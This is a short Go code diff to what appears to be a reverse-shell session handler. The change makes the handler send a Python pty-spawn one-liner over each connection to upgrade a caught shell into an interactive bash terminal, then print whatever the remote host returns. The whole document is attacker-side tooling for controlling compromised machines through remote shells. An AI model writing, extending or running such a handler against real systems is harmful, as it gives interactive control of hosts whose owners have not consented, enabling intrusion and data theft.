@@ -35,7 +35,9 @@ func sendData(conn net.Conn, data string) {
 }
 
 func handleConnection(s session) {
-	fmt.Println(s.sid)
+	fmt.Println("attempting to spawn tty session...")
+	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+	sendData(s.connection, tty_spawn)
 	for {
 		fmt.Print(receiveData(s.connection))
 	}
